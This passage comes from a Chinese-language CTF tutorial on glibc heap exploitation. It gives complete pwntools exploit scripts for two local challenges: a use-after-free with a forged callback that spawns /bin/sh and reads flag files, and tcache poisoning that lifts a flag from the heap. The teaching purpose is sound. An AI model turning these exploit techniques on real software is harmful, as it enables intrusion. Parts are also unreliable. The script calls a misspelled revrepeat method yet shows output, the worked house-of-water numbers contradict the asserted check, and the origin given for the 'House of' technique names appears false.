我沒有 \code{\%p}，但我有\textbf{一個能讀任意位址字串的原語}，
而 heap 上\textbf{剛好躺著一個程式碼位址}。
把這兩件事接起來，就得到了 PIE base。

\textbf{通用心法}：找不到 leak 的時候，問「有沒有哪裡已經存著我要的東西？」
——heap 上的函式指標、libc 在 heap 上的殘留、\code{stdout} 的 \code{\_IO\_2\_1\_stdout\_} 指標……
都是常見的寶庫。
\end{keybox}

\subsection{第四步：forge \#2 —— 把 callback 換成 \code{system@plt}}

\begin{lstlisting}[style=py]
release(2)                                        # 再一次把 S0/S1 放回 tcache[0x40]
forge2  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
forge2 += p64(0)                                  # memory = 0（跳過 printf）
forge2 += p64(pie + SYSTEM_PLT)                   # callback = system@plt
forge2 += p32(0) + p32(0)
capture_raw(0x38, b'D', forge2[:-1])
inspect(1)                                        # -> call [soul+0x28](soul)
\end{lstlisting}

最後 \code{inspect(1)} 執行到 \code{call rdx} 時：

\begin{lstlisting}[style=raw]
rdx = souls[1]->callback = system@plt
rdi = souls[1]                         <-- 而 souls[1] 的內容是 "/bin/sh"
=> system("/bin/sh")
\end{lstlisting}

\begin{keybox}[為什麼 \code{name} 要放 \code{"/bin/sh"}]
因為 \code{rdi} 被硬寫成 \code{soul} 自己（\code{mov rdi,rax}，\code{rax = soul}）。
我沒辦法控制 \code{rdi} 指向別的地方，\textbf{那我就把 \code{soul} 本身變成 \code{"/bin/sh"} 字串}。
\code{name} 就在結構的最前面（\code{+0x00}），所以 \code{soul} 這個位址上的 C 字串就是 \code{"/bin/sh"}。
\end{keybox}

\begin{warnbox}[\code{system@plt} 是 \code{0x1120} 還是 \code{0x1124}？]
\code{ELF.plt['system']} 回報 \code{0x1124}，但 \code{objdump} 顯示：

\begin{lstlisting}[style=asm]
  1120:  endbr64
  1124:  bnd jmp QWORD PTR [rip+0x2e6d]
\end{lstlisting}

\code{0x1124} 是 \code{bnd jmp}，也就是「跳過 \code{endbr64}」。
如果哪天 CET/IBT 真的被啟用，跳到沒有 \code{endbr64} 的位址會被擋下來。
所以腳本裡寫死 \code{0x1120}（從 \code{endbr64} 進去），並用 \code{assert} 確認兩個值之一：

\begin{lstlisting}[style=py]
SYSTEM_PLT = 0x1120
assert elf.plt['system'] in (0x1120, 0x1124), hex(elf.plt['system'])
\end{lstlisting}
\end{warnbox}

\subsection{完整的 heap 佈局圖（動手前先畫這張）}

\begin{lstlisting}[style=raw]
heap + 0x000  tcache_perthread_struct (0x290)

--- 兩次 capture(size=0x20) 之後 ---
heap + 0x290  [S0] 結構 chunk 0x40   -> souls[0] = 0x2a0
heap + 0x2d0  [M0] memory chunk 0x30
heap + 0x300  [S1] 結構 chunk 0x40   -> souls[1] = 0x310
heap + 0x340  [M1] memory chunk 0x30

--- release(1); release(0) 之後 ---
tcache[0x30] = M0, M1
tcache[0x40] = S0, S1        (頭是 S0)

--- capture(size=0x38)：結構彈 S0，記憶體彈 S1 ---
soul2 = 0x2a0
soul2->memory = 0x310  ==  souls[1]   <-- 偽造寫入的落點
\end{lstlisting}

\subsection{完整腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
"""soul-vault-collector: UAF -> heap leak -> forged Soul -> PIE leak -> shell"""
import os, re, sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN  = os.path.join(ROOT, 'solve/vault/soul_vault_patched')
elf  = ELF(BIN, checksec=False)

CALLBACK_SOUL = 0x1289        # stone_callbacks[0] -> callback_soul
SYSTEM_PLT    = 0x1120        # system@plt，從 endbr64 進去
assert elf.plt['system'] in (0x1120, 0x1124)

S0_OFF = 0x2a0                # souls[0] - heap
S1_OFF = 0x310                # souls[1] - heap

def start():
    return process(BIN, cwd=os.path.dirname(BIN))

def exploit(io):
    io.recvuntil(b'Choice: ')

    def capture_raw(size, name, blob, term=True):
        io.sendline(b'1')
        io.sendlineafter(b'Enter Soul Name: ', name)
        io.sendlineafter(b'Enter Memory Size (max 1024): ', str(size).encode())
        io.recvuntil(b'Inscribe Memory: ')
        io.send(blob)
        if term:
            io.sendline(b'')
        io.recvuntil(b'Choice: ')

    def release(idx):
        io.sendline(b'3')                 # 3 = release
        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
        io.recvuntil(b'Choice: ')

    def inspect(idx):
        io.sendline(b'2')                 # 2 = inspect
        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
        return io.recvuntil(b'Choice: ')

    # ---- 1. 兩個 soul（memory 各 0x20）----
    capture_raw(0x20, b'A', b'aaaa\n')
    capture_raw(0x20, b'B', b'bbbb\n')

    # ---- 2. 從 UAF 的 name 讀 tcache fd，反推 heap ----
    release(1)
    out = inspect(1)
    raw = re.search(rb'Name: ([^\n]*)\n', out).group(1)
    if len(raw) != 5:
        raise RuntimeError('bad heap leak (%d bytes)' % len(raw))
    heap = u64(raw.ljust(8, b'\x00')) << 12
    s0, s1 = heap + S0_OFF, heap + S1_OFF
    assert s1 >> 12 == heap >> 12
    log.success('heap = %#x  souls[0] = %#x  souls[1] = %#x', heap, s0, s1)

    # ---- 3. 讓 tcache[0x40] = [S0, S1] ----
    release(0)

    # ---- 4. forge #1：把 souls[1] 變成一台讀取機，偷 PIE ----
    forge1  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
    forge1 += p64(s0 + 0x28)          # memory -> soul2->callback（裡面是 PIE+0x1289）
    forge1 += p64(0)                  # callback = 0（先不要呼叫）
    forge1 += p32(0) + p32(0)
    capture_raw(0x38, b'C', forge1[:-1])

    out  = inspect(1)
    raw  = re.search(rb'Memory: ([^\n]*)\n', out).group(1)
    if len(raw) != 6:
        raise RuntimeError('bad PIE leak (%d bytes)' % len(raw))
    pie  = u64(raw.ljust(8, b'\x00')) - CALLBACK_SOUL
    assert pie & 0xfff == 0, 'PIE base not page aligned'
    log.success('callback leak -> PIE base = %#x', pie)

    # ---- 5. 再一次把 S0/S1 放回 tcache ----
    release(2)

    # ---- 6. forge #2：callback = system@plt ----
    forge2  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)
    forge2 += p64(0)
    forge2 += p64(pie + SYSTEM_PLT)
    forge2 += p32(0) + p32(0)
    capture_raw(0x38, b'D', forge2[:-1])

    # ---- 7. inspect(1) -> system("/bin/sh") ----
    io.sendline(b'2')
    io.sendlineafter(b'Enter vessel index (0-7): ', b'1')
    return io

for attempt in range(10):
    io = start()
    try:
        io = exploit(io); break
    except Exception as e:                 # leak 被 0x00 截斷等情況 -> 重試
        log.warning('attempt %d failed: %s', attempt, e); io.close()

io.sendline(b'cat flag.txt flag /flag* 2>/dev/null; id')
print(io.revrepeat(2).decode(errors='replace'))
\end{lstlisting}

\begin{keybox}[為什麼要有 \code{for attempt in range(10)} 的重試迴圈]
\code{fd} 的高位 byte 是 \code{0x00}，但 ASLR 的位址有機率讓\textbf{中間}某個 byte 也是 \code{0x00}
（例如位址是 \code{0x55ab00...}）。那時候字串會提早結束，你只會拿到 3\textasciitilde4 bytes。
\textbf{這不是 bug，是機率}。寫個重試迴圈，或改用 \code{recvuntil} 精確讀固定長度。
\end{keybox}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
[+] heap = 0x5616bbddd000   souls[0] = 0x5616bbddd2a0   souls[1] = 0x5616bbddd310
[+] callback leak = 0x56168bb96289  ->  PIE base = 0x56168bb95000
[*] forged Soul @ 0x5616bbddd310 : name="/bin/sh" callback=system@plt (0x56168bb96120)

--- Vessel [1] ---
Name: /bin/sh
ID: 0x0
OWASP{local_test_flag_soul_vault}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),954(libvirt),958(docker),960(ollama),998(wheel)

[+] FLAG = OWASP{local_test_flag_soul_vault}
\end{lstlisting}

\begin{keybox}[注意 \code{--- Vessel [1] ---} 這行]
它是在 \code{system} \textbf{之前}印的，而 \code{Memory:} 那行不見了——
因為我們把 \code{memory} 設成 \code{0}，\code{printf} 被跳過了（腳本裡刻意如此）。
接著 \code{call rdx} 就跳進 \code{system}，然後 flag 的內容就從 shell 裡被 \code{cat} 出來。
\end{keybox}

\begin{keybox}[最後一步為什麼用 \code{revrepeat} 而不是 \code{recvuntil}]
因為 \code{/bin/sh} 進去之後\textbf{不會再回到選單}，\code{recvuntil(b'Choice: ')} 會逾時。
用 \code{io.revrepeat(2)} 把剩下的輸出全部收乾淨就好。
\textbf{拿到 shell 之後的互動，和一般選單題的收尾方式不一樣，這點要記得。}
\end{keybox}

\subsection{這一題要帶走的三件事}

\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
  \item \textbf{「寫入到一個指標指的地方」是最強的漏洞型態}。
        \code{read\_string(soul->memory, n)} 本身沒錯，
        錯的是 \code{soul->memory} 可以是別人的記憶體。
        \textbf{看到「先 malloc 再寫進去」的函式，就要想「這次 malloc 會回傳哪一塊」。}
  \item \textbf{沒有 \code{\%p} 不代表沒有 leak}。
        有「讀任意字串」的原語 + heap 上躺著一個 code pointer $=$ PIE base。
  \item \textbf{heap 與 PIE 的基底無關}（第二章的實測表），
        所以這題一定要走「從 heap 挖出 PIE」這條路，不能偷懶。
\end{enumerate}

\section{第五題：house-of-water}
\label{chap:house}

最後一題。它把前面所有東西串在一起：\textbf{UAF}（ch07）、
\textbf{safe-linking 的 heap leak}（ch06）、\textbf{tcache poisoning}（ch06 提過名字，
這裡真的動手做）。

\begin{keybox}[先講這一題最有趣的地方]
flag \textbf{根本沒有被讀出來印出來}——它在程式啟動時就被複製到 heap 上，
然後\textbf{一直躺在那裡}。你不需要任何「讀檔案」的函式、
不需要 \code{system("/bin/sh")}、不需要 leak libc 或 PIE
（雖然 PIE 是開著的）。

你只要\textbf{讓一次 \code{malloc} 回傳 flag 所在的那塊記憶體}，
然後用 \code{show} 把它印出來。
\end{keybox}

\subsection{防禦機制}

\begin{lstlisting}[style=raw]
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled   (未強制)
IBT:        Enabled   (未強制)
\end{lstlisting}

\begin{keybox}[看起來很硬，但我們完全不需要繞過它們]
Canary 是防 stack overflow 的——這題沒有 stack overflow。
PIE 是防「寫死程式碼位址」的——但我們\textbf{一個程式碼位址都不用}。
Full RELRO 是防改 GOT 的——不需要。
\textbf{防禦機制列表只是「你必須走哪條路」的提示，不是每項都要打穿。}
這題的答案是：全部繞開，只玩 heap。
\end{keybox}

\subsection{全域陣列與選單}

\code{nm} 一下就知道這題的骨架：

\begin{lstlisting}[style=raw]
0000000000004040 b chunks       # chunks[64]
0000000000004240 b sizes        # sizes[64]
0000000000004440 b freed        # freed[64]  (byte 陣列)
\end{lstlisting}

\begin{lstlisting}[style=raw]
1) malloc   2) free   3) edit   4) show   5) exit
\end{lstlisting}

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{chunks[i]}：第 i 格的指標。
  \item \code{sizes[i]}：當初要的大小（原始 request，不是 chunk size）。
  \item \code{freed[i]}：\code{0} 或 \code{1}，標記「這格被 free 過了」。
\end{itemize}

\subsection{\code{setup()}：flag 的第一站}

\begin{lstlisting}[style=asm]
  1357:  mov    edi,0x80
  135c:  call   malloc@plt            ; <== 這題第一次 malloc
  1361:  mov    [rbp-0x10],rax        ; buf
  ...
  139b:  lea    rax,[rip+0xc76]       # "./flag.txt"
  13a2:  mov    rdi,rax
  13a5:  call   fopen@plt
  ...
  13c5:  call   fgets@plt             ; fgets(buf, 0x80, fp)  -> flag 進 heap
  1403:  call   fclose@plt
\end{lstlisting}

\begin{keybox}[為什麼 \code{buf} 一定在 \code{heap+0x2a0}]
這是第六章的 \code{tcache\_perthread\_struct}（\code{0x290} bytes）再來一次：

\begin{lstlisting}[style=raw]
第一次 malloc(0x80)
   glibc 先偷偷配 tcache_perthread_struct -> chunk 0x290，佔 heap+0x000 ~ heap+0x290
   然後才配我們要的 0x80       -> chunk 0x90，標頭在 heap+0x290
                                   user 指標 = heap+0x290+0x10 = heap+0x2a0
\end{lstlisting}

實測（gdb）：

\begin{lstlisting}[style=raw]
0x55555555b000: 0x0000000000000000  0x0000000000000291   <- tcache struct
0x55555555b290: 0x0000000000000000  0x0000000000000091   <- flag chunk 標頭
0x55555555b2a0: "flag{local_test_flag_house_of_water}\n"  <- flag 就在這
\end{lstlisting}

\textbf{所以只要讓某次 \code{malloc} 回傳 \code{heap+0x2a0}，我就贏了。}
\end{keybox}

\begin{keybox}[如果檔案不存在呢]
程式有做 fallback：\code{fgets} 讀失敗就自己塞一個假的
\code{flag\{sing\_sing\_flag\_thxt\}}。所以\textbf{在遠端就算讀不到檔案，
heap 上依然會有東西可以偷}——這是這題設計上很聰明的一點。
\end{keybox}

\subsection{四個功能各自的問題}

\subsubsection{\code{do\_free}：就是 UAF 本身}

\begin{lstlisting}[style=asm]
  16bc:  mov    eax,[rbp-0x4]        ; idx
  16d0:  mov    rax,[rdx+rax*1]      ; rax = chunks[idx]
  16d4:  mov    rdi,rax
  16d7:  call   free@plt             ; free(chunks[idx])
  16e1:  lea    rdx,[rip+0x2d58]     # freed
  16e8:  mov    BYTE PTR [rax+rdx*1],0x1   ; freed[idx] = 1
\end{lstlisting}

\textbf{只把 \code{freed[idx]} 設成 1，\code{chunks[idx]} 原封不動。}
這就是 UAF：free 之後 \code{chunks[idx]} 還是原本的位址，
而且 \code{edit}/\code{show} 都還會用它。\textbf{和第四題同一個病。}

\subsubsection{\code{check\_bounds}：那個 \code{-0x10} 的「禮物」}

\code{edit} 和 \code{show} 都會先呼叫 \code{check\_bounds(idx, off, len)}：

\begin{lstlisting}[style=asm]
  1520:  cmp    [rbp-0x28],0x0       ; len
  1525:  jle    die                  ; len <= 0 就死
  1527:  cmp    [rbp-0x28],0x400
  152f:  jle    ok                   ; len <= 0x400 才行
  ...
  1540:  movzx  eax,BYTE PTR [rax+rdx*1]  ; freed[idx] ?
  1552:  je     zero
  1554:  mov    rax,0xfffffffffffffff0 ; freed -> 下限 -0x10
  155d:  mov    eax,0x0                 ; 沒 freed -> 下限 0
  156a:  cmp    rax,[rbp-0x8]           ; off >= 下限 ?
  ...
  1587:  add    rax,rdx                 ; off + len
  158a:  lea    rcx,[rax+0x10]          ; + 0x10
  15a6:  add    rax,0x10                ; sizes[idx] + 0x10
  15aa:  cmp    rcx,rax
  15ad:  jbe    ok                     ; off+len <= sizes[idx]
\end{lstlisting}

翻譯成 C：

\begin{lstlisting}[style=c]
if (len <= 0 || len > 0x400)                    die("Invalid length");
long lo = freed[idx] ? -0x10 : 0;               /* 被 free 過才允許 -0x10 */
if (off < lo)                                   die("Invalid offset");
if (off + len > sizes[idx])                     die("Out of bounds");
\end{lstlisting}

\begin{whybox}[那個 \code{-0x10} 是什麼意思]
一個 chunk 的\textbf{標頭}是 16 bytes（\code{prev\_size} + \code{size}），
而 \code{chunks[idx]} 指的是\textbf{標頭再往後 0x10 的 user 指標}。
所以「\code{off = -0x10}」正好指回\textbf{標頭開頭}。

換句話說：對一個已經 free 的 chunk，\code{off} 可以到 \code{-0x10}，
\textbf{你連 chunk 標頭都能讀、能寫}。題目等於主動把
「free 之後 \code{fd}/\code{size} 都可以摸」這件事打開給你。

（實務上我們只需要 \code{off = 0}——因為 \code{fd} 就在 user+0。
但你可以用 \code{off=-0x10} 印出標頭來\textbf{驗證}你對 heap 的理解，很值得試。）
\end{whybox}

實測 \code{show(0, -0x10, 0x20)}（A 已 free）：

\begin{lstlisting}[style=raw]
prev_size = 0x7f7fde6170c0      <- 前一塊留下來的殘值（不重要）
size      = 0x111               <- chunk size 0x110 + PREV_INUSE
\end{lstlisting}

\subsubsection{\code{do\_edit} 與 \code{do\_show}：純粹的讀寫原語}

\begin{lstlisting}[style=asm]
  ; do_edit 的核心
  17a4:  mov    esi,0x1
  17a9:  call   fread@plt        ; fread(chunks[idx]+off, 1, len, stdin)  <- 任意寫
  ; do_show 的核心
  1838:  movzx  eax,BYTE PTR [rax]   ; chunks[idx]+off+i
  184a:  call   printf@plt           ; printf("%02x ", byte)   <- 任意讀（hexdump）
\end{lstlisting}

\begin{keybox}[\code{show} 是 hexdump，不是 \code{\%s}——這很重要]
第四題用 \code{printf("\%s")} 讀字串，會被 \code{0x00} 截斷，所以 leak 可能只有 3\textasciitilde4 bytes，
要靠重試迴圈碰運氣。

這一題用 \textbf{hexdump}（逐 byte 印 \code{\%02x}），\textbf{你要幾個 byte 就給幾個}。
所以這裡的 leak \textbf{百分之百可靠，不需要重試}。

\textbf{看到「\code{\%s} 讀記憶體」就要擔心 \code{0x00}；看到 hexdump 就不用。}
\end{keybox}

\subsection{複習：tcache 與 safe-linking}

（細節在第 \ref{sec:safelink} 節，這裡只列等一下要用的三條規則。）

\begin{enumerate}[leftmargin=1.5em,itemsep=2pt]
  \item 同一種大小的 chunk 放同一個 bin，\textbf{LIFO}：最後 free 的會最先被 \code{malloc} 拿回去。
  \item 一個 free 掉的 chunk，它的 \code{fd} 存在 \textbf{user+0x0}，\code{key} 存在 \textbf{user+0x8}。
  \item safe-linking：\code{fd = next \^{} (自己位址 >> 12)}。
        如果 \code{next} 是 NULL，那 \code{fd} 就\textbf{直接等於「自己位址 >> 12」}。
\end{enumerate}

\subsection{步驟一：兩個同 bin 的兄弟，從 \code{fd} 反推 heap}

\begin{lstlisting}[style=py]
SIZE = 0x100                       # chunk size 0x110
add(0, SIZE)                       # A
add(1, SIZE)                       # B
free(0)                            # tcache[0x110] = [A]
free(1)                            # tcache[0x110] = [B, A]
\end{lstlisting}

先看 A（它是 bin 的尾巴，\code{fd} 指到 NULL）：

\begin{lstlisting}[style=raw]
show(0, 0, 0x20)  ->
  4d cd 0e 59 05 00 00 00 | c4 10 df 66 02 cc 49 3e
  66 6c 61 67 5f 68 6f 75 73 65 5f 6f 66 5f 77 61
  ^^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
        fd (= A>>12)              key (常數)
\end{lstlisting}

\begin{lstlisting}[style=py]
fd_a = 0x00000005590ecd4d
heap = fd_a << 12                 # = 0x5590ecd4d000
\end{lstlisting}

再看 B（\code{fd} 指到 A）：

\begin{lstlisting}[style=raw]
show(1, 0, 0x20)  ->
  89 1a 06 a7 fa 55 00 00 | c4 10 df 66 02 cc 49 3e
  ^^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
     fd (= A ^ (B>>12))          key（和 A 的 key 一模一樣！）
\end{lstlisting}

\begin{keybox}[為什麼 A 的 \code{fd} 就是 heap 的一部分]
\code{fd = PROTECT(NULL) = NULL \^{} (A的位址 >> 12)}，
而 \code{A} 的位址是 \code{heap+0x510}。

\[
(\text{heap}+0x510) \gg 12 = \text{heap} \gg 12
\]

因為 \code{0x510 < 0x1000}（同一頁），右移 12 位之後\textbf{頁內偏移被丟掉}，
所以 \code{fd\_a} 就等於 \code{heap >> 12}。反過來 \code{heap = fd\_a << 12}。
\end{keybox}

\begin{lstlisting}[style=py]
fd_b = 0x000055faa7061a89
A    = fd_b ^ fd_a                # = 0x55fff8f99510  == heap+0x510
assert A >> 12 == fd_a            # 驗算：A 和 fd_a 的「頁」要一致
\end{lstlisting}

\begin{keybox}[為什麼 \code{A = fd\_b \^{} fd\_a} 成立]
\code{fd\_b = PROTECT\_PTR(B, A) = A \^{} (B >> 12)}。
而 A 和 B 是\textbf{同一頁}的鄰居（\code{B = A + 0x110}），
所以 \code{B >> 12 == A >> 12 == fd\_a}。於是

\[
A = \code{fd\_b} \;\^{}\; \code{fd\_a}
\]

\textbf{注意}：\code{A = fd\_b \^{} fd\_a} 只有在 A、B 同頁時才對。
所以一定要 \code{assert} 檢查 \code{(fd\_b\^{}fd\_a) >> 12 == fd\_a}，
不然你會在 ASLR 剛好把兩塊分到不同頁時算錯而渾然不知。
\end{keybox}

\begin{warnbox}[那個 \code{key} 兩塊都一樣，是故意的嗎？]
不是——那是 glibc 的設計。\code{tcache\_key} 是\textbf{每個 process 一個隨機常數}，
free 的時候寫進 \code{user+8}，用來偵測 double free
（\code{free(): double free detected in tcache 2}）。
所以你看到兩塊的 key 一樣，正好是「\code{key} 是全域常數」的實證。
\end{warnbox}

\subsection{步驟二：tcache poisoning}

現在 B 還躺在 bin 的頭部，而 \code{fd} 是\textbf{我可以用 \code{edit} 改的}
（因為 B 已經 free，\code{off=0} 完全合法）。我把 B 的 \code{fd}
指向\textbf{我想要的任意位址}：

\begin{lstlisting}[style=py]
target = heap + 0x290                        # 假 chunk 的「標頭」
edit(1, 0, p64(target ^ (heap >> 12)))       # B->fd = PROTECT(target)
log.info('poisoned tcache[0x110]: B -> %#x', target)
\end{lstlisting}

\begin{keybox}[為什麼是 \code{heap+0x290}，而不是 \code{heap+0x2a0}]
兩個都對，但意思不同：

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{malloc} 回傳的是 \code{chunk + 0x10}（\textbf{跳過標頭}）。
  \item 我想要拿到 \code{heap+0x2a0}（flag），所以我必須「假裝有一塊 chunk」
        它的標頭在 \code{heap+0x290}。
  \item 順便驗證對齊：\code{0x290 \% 16 = 0}，符合 glibc 2.35 的
        \code{aligned\_OK} 檢查（不然會噴 \code{malloc(): unaligned tcache chunk detected}）。
\end{itemize}
\end{keybox}

\begin{keybox}[safe-linking 在這裡的角色]
我\textbf{不能}直接寫 \code{p64(target)}——glibc 讀 \code{fd} 時會做
\code{REVEAL\_PTR}，也就是\textbf{再 XOR 一次 \code{B>>12}}。
所以寫進去的值必須是 \code{target \^{} (B >> 12)}，而
\code{B >> 12 == heap >> 12}（同頁）。這就叫 \textbf{PROTECT}。

實測：\code{PROTECT(0x55fff8f99290) = 0x55faa7061d09}。
\end{keybox}

\subsection{步驟三：兩次 malloc，第二次就拿到 flag}

\begin{lstlisting}[style=py]
add(2, SIZE)      # 第一次：彈出 B          -> chunks[2] = B
add(3, SIZE)      # 第二次：彈出假 chunk    -> chunks[3] = heap+0x2a0  <== flag!
\end{lstlisting}

\begin{lstlisting}[style=raw]
[*] chunks[3] = 0x557e6a38b2a0  (flag buffer)
\end{lstlisting}

\begin{keybox}[看 bin 的變化就知道了]
\begin{lstlisting}[style=raw]
free(0); free(1) 之後:   head -> B -> A -> NULL
edit(1,0,...) 之後:      head -> B -> target(假) -> ?     (A 被繞過了)
add(2):  彈出 B            head -> target
add(3):  彈出 target       head -> REVEAL(target->fd)      (count 已歸零，無所謂)
\end{lstlisting}

\textbf{注意}：把 \code{B->fd} 改成 target 之後，\textbf{A 就被踢出鏈了}
（B 的下一個不再是 A）。這沒關係——我們不需要 A 了，
只需要「第 2 次 \code{malloc} 拿到 target」。
\end{keybox}

\subsection{步驟四：\code{show} 出 flag}

\begin{lstlisting}[style=py]
return show(3, 0, 0x80)      # chunks[3] 現在 = heap+0x2a0
\end{lstlisting}

\begin{keybox}[再一次：這不是「讀檔案」]
\code{chunks[3]} 只是一個普通的指標，值是 \code{heap+0x2a0}。
\code{show(3, 0, 0x80)} 就只是把那個位址開始的 0x80 個 byte hexdump 出來。
\textbf{整個 flag 拿到的過程，一次檔案 I/O 都沒有。}
\end{keybox}

\begin{warnbox}[想偷懶直接讀 A 的殘值？不行]
\code{show} 的時候你可能會注意到一個誘人的東西——A 的 user+0x10 開始
竟然是 \code{"flag\_house\_of\_wa"}：

\begin{lstlisting}[style=raw]
show(0, 0, 0x20) ->
  4d cd 0e 59 05 00 00 00 | c4 10 df 66 02 cc 49 3e   <- fd, key 蓋掉了前 16 bytes
  66 6c 61 67 5f 68 6f 75 73 65 5f 6f 66 5f 77 61   <- "flag_house_of_wa"
\end{lstlisting}

原因是：\code{setup()} 的 \code{fgets} 讀檔時配了一塊 \code{0x1010} 的緩衝區，
檔案內容就存在那裡；\code{fclose} 之後那塊被回收，而 \textbf{A 剛好配到同一塊記憶體}
（實測 A 的標頭也在 \code{heap+0x500}，user 在 \code{heap+0x510}，
和當初 \code{fgets} 緩衝區的 user 指標完全一樣）。

所以 A 的殘值裡有 flag 的碎片。\textbf{但是前面 16 bytes 已经被 \code{fd}/\code{key} 蓋掉了}
（那 16 bytes 是 \code{"flag\{local\_test"}\ ），你補不回來。
\textbf{碎片不是 flag。} 老老實實 poisoning 才是正解。
\end{warnbox}

\subsection{完整腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
"""house-of-water: UAF -> safe-linking heap leak -> tcache poisoning -> flag"""
import os, re, sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN  = os.path.join(ROOT, 'solve/house/chal_patched')
elf  = ELF(BIN, checksec=False)

SIZE          = 0x100
TCACHE_STRUCT = 0x290              # flag chunk 的「假標頭」
FLAG_USER     = TCACHE_STRUCT + 0x10   # heap+0x2a0

def start():
    return process(BIN, cwd=os.path.dirname(BIN))

def exploit(io):
    io.recvuntil(b'> ')

    def add(idx, size):
        io.sendline(b'1')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Size: ', str(size).encode())
        io.recvuntil(b'> ')

    def free(idx):
        io.sendline(b'2')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.recvuntil(b'> ')

    def edit(idx, off, data):
        io.sendline(b'3')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Offset: ', str(off).encode())
        io.sendlineafter(b'Length: ', str(len(data)).encode())
        io.recvuntil(b'Data (')
        io.sendafter(b'bytes): ', data)        # fread()：raw bytes，不加換行
        io.recvuntil(b'> ')

    def show(idx, off, length):
        io.sendline(b'4')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Offset: ', str(off).encode())
        io.sendlineafter(b'Length: ', str(length).encode())
        out = io.recvuntil(b'> ')
        raw = b''.join(bytes.fromhex(h.decode())
                       for h in re.findall(rb'\b[0-9a-f]{2}\b', out))
        return raw[:length]

    # --- 1. 同一個 tcache bin 的兩兄弟 --------------------------------
    add(0, SIZE)                 # A
    add(1, SIZE)                 # B
    free(0)                      # tcache[0x110] = [A]
    free(1)                      # tcache[0x110] = [B, A]

    # --- 2. 從 UAF 的 fd 反推 heap（hexdump，不會被 0x00 截斷）---------
    fd_a  = u64(show(0, 0, 8))   # A->fd == A >> 12
    fd_b  = u64(show(1, 0, 8))   # B->fd == A ^ (B >> 12)
    a_addr = fd_b ^ fd_a
    heap   = fd_a << 12
    assert a_addr >> 12 == fd_a, 'A/B 不在同一頁'
    log.success('A = %#x  (heap+%#x)   heap = %#x', a_addr, a_addr - heap, heap)

    # --- 3. tcache poisoning ------------------------------------------
    target = heap + TCACHE_STRUCT
    edit(1, 0, p64(target ^ (heap >> 12)))    # B->fd = PROTECT(target)
    log.info('poisoned tcache[0x110]: B -> %#x', target)

    # --- 4. 兩次 malloc：B，然後是假 chunk ------------------------------
    add(2, SIZE)                 # 彈出 B
    add(3, SIZE)                 # 彈出 target -> chunks[3] = heap+0x2a0
    log.info('chunks[3] = %#x  (flag buffer)', heap + FLAG_USER)

    # --- 5. 把 flag 印出來 ---------------------------------------------
    return show(3, 0, 0x80)

io = start()
flag = exploit(io)
print(flag.decode(errors='replace'))
m = re.search(rb'flag\{[^}]*\}', flag)
log.success('FLAG = %s', m.group().decode())
io.close()
\end{lstlisting}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
[+] Starting local process '.../solve/house/chal_patched': pid 1792076
[+] A = 0x557e6a38b510  (heap+0x510)   heap = 0x557e6a38b000
[*] poisoned tcache[0x110]: B -> 0x557e6a38b290
[*] chunks[3] = 0x557e6a38b2a0  (flag buffer)

flag{local_test_flag_house_of_water}
[+] FLAG = flag{local_test_flag_house_of_water}
\end{lstlisting}

\begin{keybox}[\code{0x510} 這個數字是哪來的]
它不是我們算的，是\textbf{觀察出來的}。實測 layout：

\begin{lstlisting}[style=raw]
heap+0x000   tcache_perthread_struct   (chunk 0x290)
heap+0x290   flag chunk                (chunk 0x90)  -> user heap+0x2a0
heap+0x320   （setup 期間 fopen/fgets 用過的痕跡，已回收）
heap+0x500   A 的標頭                 (chunk 0x110) -> user heap+0x510
heap+0x610   B 的標頭                 (chunk 0x110) -> user heap+0x620
\end{lstlisting}

\textbf{為什麼 A 落在 0x510 而不是緊接 flag 之後？}
因為 \code{setup()} 期間 \code{fopen} 配了 FILE 結構、\code{fgets} 又配了 4KB 讀取緩衝區，
\code{fclose} 把它們還了回去，A 的 \code{malloc(0x100)} 就從回收出來的位置切。

\textbf{重點是：這個數字你不需要猜對。}
腳本裡只用到 \code{heap+0x290}（tcache 結構，規則可推）與 \code{A}（leak 來的），
\code{0x510} 只是拿來驗算與除錯。
\end{keybox}

\subsection{「House of \dots」是什麼？}

你在 pwn 世界會一直看到 \code{House of Water}、
\code{House of Force}、\code{House of Spirit}、
\code{House of Einherjar}…… 這些名字取自《冰與火之歌》的家族，
是一串\textbf{以「House of X」命名的 heap 利用技巧}。

它們的共同點是：\textbf{不用傳統的 tcache poisoning}，
而是去鑽 glibc 內部函式的縫隙——
例如 \code{malloc\_consolidate}、\code{unlink}、
\code{\_int\_malloc} 的邊界檢查——所以能繞過比較嚴格的檢查。

\begin{keybox}[這一題其實不是真的 House of Water]
這題叫 house-of-water 只是\textbf{命名致敬}——它實際的路徑是乾淨的
\textbf{tcache poisoning}（最經典、最好懂的那一種）。
真正的 House of Water 牽涉 \code{mp\_}. 與 \code{av->system\_mem} 的操作，
比這題難得多。

\textbf{所以：看到題目名字很嚇人，先逆下去再說。}
名字通常只是作者的心情，不是難度保證。
\end{keybox}

\subsection{這一題要帶走的三件事}

\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
